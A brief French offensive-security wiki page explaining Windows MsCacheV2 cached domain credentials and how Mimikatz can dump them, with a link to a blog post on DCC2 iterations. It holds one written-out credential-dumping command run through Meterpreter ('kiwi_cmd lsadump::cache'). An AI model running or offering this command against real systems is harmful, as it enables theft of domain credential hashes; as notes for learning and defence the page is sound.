---
title: MsCacheV2
permalink: /MsCacheV2/
---

# MsCacheV2

Par défaut Windows stocke des hashs des utilisateurs du domaine qui s'authentifient pour permettre une authentification quand le DC n'est pas joignable.

Mimikatz permet de dumper ces hashs:
```
meterpreter > kiwi_cmd lsadump::cache
```

Ressources
----------
- [MsCache v2 / DCC2 et nombre d’itérations](http://blog.gentilkiwi.com/securite/mscache-v2-dcc2-iteration)
